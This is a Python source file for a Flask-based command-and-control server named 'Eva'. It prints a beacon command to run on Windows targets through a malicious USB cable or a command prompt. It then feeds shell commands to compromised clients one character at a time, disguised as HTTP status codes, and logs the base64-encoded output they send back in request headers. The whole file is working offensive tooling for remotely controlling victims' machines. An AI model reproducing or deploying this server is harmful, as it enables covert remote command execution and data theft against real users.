"""
Eva - Python C2 Server (via Flask Webhook)

Copyright (C) 2025 Trigat
"""

from flask import Flask, abort, request, Response
from datetime import datetime
import deploy_beacon
import base64
import sys

app = Flask(__name__)

current_command = {}
client_output_log = {}  # Stores output per client

if len(sys.argv) > 1:
    server_url = f"{sys.argv[1]}"
else:
    from deploy_beacon import get_local_ip
    server_url = f"http://{get_local_ip()}:8000"

beacon_code = deploy_beacon.generate_beacon(server_url)

print("\n[*] Execute this command on Windows target via O.MG or command prompt:\n")
print(beacon_code.strip() + "\n\n")

@app.route("/cmd/<b64>", methods=["GET"])
def set_cmd(b64):
    try:
        decoded = base64.b64decode(b64.encode()).decode()
        for cid in current_command.keys():
            current_command[cid] = decoded
        print(f"[+] Set command for all clients: {repr(decoded)}")
        return "OK\n"
    except Exception as e:
        print(f"[!] Decode error: {e}")
        return "ERROR\n", 400

@app.route("/poll", methods=["GET"])
def poll():
    cid = request.headers.get("X-Client")
    if not cid:
        return "[!] Missing X-Client header\n", 400

    # Receive result from client
    output = request.headers.get("X-Output")
    if output:
        try:
            result = base64.b64decode(output).decode()
            client_output_log.setdefault(cid, "")
            client_output_log[cid] += result + "\n"
            with open("log/log.txt", "a", encoding="utf-8") as f:
                f.write(f"\n{datetime.now().isoformat()}\n[{cid} OUTPUT]\n{result}\n")
            print(f"[{cid} OUTPUT]\n{result}")
        except Exception as e:
            print(f"[!] Decode error from {cid}: {e}")

    # Initialize command buffer if missing
    current_command.setdefault(cid, "")

    # Send next character of command
    if current_command[cid]:
        char = current_command[cid][0]
        current_command[cid] = current_command[cid][1:]
        code = 200 + ord(char)
        print(f"[>] Sending char: {repr(char)} as status code {code}")
        return "", code
    else:
        return "", 204

@app.route("/cmd/hook", methods=["GET"])
def view_output():
    if not client_output_log:
        return Response("[No output received yet]", mimetype="text/plain")

    output = ""
    for cid, log in client_output_log.items():
        output += f"== Client {cid} ==\n{log}\n"
    return Response(output.strip(), mimetype="text/plain")

@app.route("/log/log.txt", methods=["GET"])
def local_log_access():
    if request.remote_addr != '127.0.0.1':
        abort(403)

    try:
        with open("log/log.txt", "r", encoding="utf-8") as f:
            content = f.read()
        return Response(content, mimetype="text/plain")
    except FileNotFoundError:
        return Response("[Log file not found]", mimetype="text/plain")

@app.route("/cmd/clean", methods=["GET"])
def clear_output():
    client_output_log.clear()
    try:
        open("log/log.txt", "w").close()
    except Exception as e:
        print(f"[!] Error clearing log file: {e}")
    return "Output cleared\n"

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=8000)
